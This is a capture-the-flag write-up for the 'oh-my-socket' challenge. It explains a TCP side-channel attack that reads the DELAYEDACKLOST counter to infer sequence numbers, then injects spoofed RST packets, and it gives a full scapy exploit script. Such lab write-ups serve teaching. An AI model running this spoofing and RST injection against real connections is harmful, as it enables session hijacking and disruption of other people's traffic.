# oh-my-socket-EN

This is a challege about TCP side channel. Idea comes from several papers about TCP side channel written by Mr. Qian Zhiyun. You can go to [Mr. Qian's homepage](https://www.cs.ucr.edu/~zhiyunq/publications.html) if you are interested. Let's take a look at this challege first.

There are three containers in the given docker files. One client host and the server host have established TCP communication. After establishing the communication, both of them are in the waiting state. There is no data packet sent between them. The server host has a flag. Sending the character `*ctf` to the server can get the flag. At the same time, the client host also provides a function of arbitrary file reading. The third host provides the function of executing any Python file, and installs the scapy Library in advance.

There are the following information: client IP (172.21.0.2), client port (7775), server IP (172.21.0.2), server port (21587), any file read on the client, any code execution on a machine with the same subnet pre installed with the scape library.

In fact, the idea is more direct now. Find a way to interrupt the communication between the client and the server, and then send a `*ctf` on the connection with the server to get the flag. The most direct way is to construct RST attack. Now that we have all the IP and port of communication, we just need to determine the seq value. Obviously, two minutes of brute force seq is not enough. We need to find a more ingenious way to find the seq value.

According to the side channel method mentioned in the above paper, when we disguise as a server to send a packet to a client, if the seq value of the packet sent this time is less than the expected seq value to be received, a timer DELAYEDACKLOST related to TCP in Linux operating system will be increased by 1, and this timer can be found in `/proc/net/netstat`, then our attack plan is clear, disguised as a server, send communication packets to the client, then it read the value of the DELAYEDACKLOST value, if the timer is increased by one, it means that the seq value we sent is less than the expected one. In this way, the expected range of seq value can be determined in a very fast time, and then it sends RST packets to the server host to interrupt the communication. Finally, it connects to the server and gets the flag.

This is my exp, and it maybe work for you.

```
from scapy.all import *
import requests
from socket import *


def send_ack(seq):
    TCPLayer = TCP(sport=21587, dport=7775, flags='A', seq=seq, ack=3521354383)
    IPLayer = IP(src='172.21.0.2',dst='172.21.0.3')
    data = 'flag'
    pkt = IPLayer/TCPLayer/data
    send(pkt, verbose=0)


def send_bye(seq):
    TCPLayer = TCP(sport=7775, dport=21587, flags='A', seq=seq, ack=3521354383)
    IPLayer = IP(src='172.21.0.3',dst='172.21.0.2')
    data = 'flag'
    pkt = IPLayer/TCPLayer/data
    send(pkt, verbose=0)


def get_num():
    url = 'http://172.21.0.3:5000/file?name=/proc/net/netstat'
    r = requests.get(url=url)
    data = r.text.split('\n')[1]
    num = data.split(' ')[19]
    return num


def send_rst(seq):
    TCPLayer = TCP(sport=21587, dport=7775, flags='R', seq=seq, ack=3521354383)
    IPLayer = IP(src='172.21.0.2', dst='172.21.0.3')
    data = 'flag'
    pkt = IPLayer / TCPLayer / data
    send(pkt, verbose=0)


def connect():
    HOST = '172.21.0.2'
    PORT = 21587
    BUFSIZ = 1024
    ADDR = (HOST, PORT)

    tcp_socket = socket(AF_INET, SOCK_STREAM)
    tcp_socket.connect(ADDR)
    data = '*ctf'
    tcp_socket.send(data.encode())
    resp = tcp_socket.recv(BUFSIZ)
    if resp:
        print(resp.decode('utf-8'))

    tcp_socket.close()

min = 0
max = 4294967296
a = int(get_num())

while abs(max - min) > 1:
    mid = (max + min) // 2
    send_ack(mid)
    num = int(get_num())

    if num - a == 1:
        min = mid
        a = num
    else:
        max = mid

ans = max

# start to rst attack
for i in range(ans - 30, ans + 30):
    send_rst(i)

# start connect to server
send_bye(ans)
connect()
```